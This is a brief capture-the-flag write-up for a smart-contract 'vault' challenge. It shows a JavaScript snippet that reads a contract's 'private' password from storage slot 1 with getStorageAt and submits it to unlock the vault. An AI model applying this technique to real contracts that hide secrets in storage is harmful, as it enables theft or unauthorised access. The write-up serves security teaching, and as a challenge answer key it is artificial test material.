# Answer

Goal: Unlock the vault.

## 1. Unlocking the vault

Nothing is hidden in the blockchain, even if the storage variable is marked private it doesn't mean it's invisible. We can use web3 function getStorageAt to take a peak and consequently submit the same value:

```js
await contract.unlock(
  await web3.eth.getStorageAt(contract.address, 1)
)
```

